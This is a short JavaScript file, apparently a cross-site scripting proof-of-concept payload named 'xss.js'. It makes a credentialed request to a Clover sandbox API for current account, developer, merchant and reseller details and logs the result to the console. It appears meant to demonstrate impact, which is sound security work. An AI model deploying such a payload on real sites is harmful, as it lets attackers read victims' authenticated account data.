// xss.js

function fetchData() {
  const url = 'https://sandbox.dev.clover.com/v3/accounts/current?expand=primaryDeveloper%2CprimaryEnterprise%2CprimaryMerchant%2CprimaryMerchant.properties%2CprimaryReseller';
  const headers = new Headers({ 'Content-Type': 'application/json' });

  fetch(url, { 
    method: 'GET', 
    headers: headers, 
    credentials: 'include' 
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    return response.json();
  })
  .then(data => {
    console.log(data);
  })
  .catch(error => {
    console.error('Fetch error:', error);
  });
}

// Call the fetchData function when the script is loaded
fetchData();
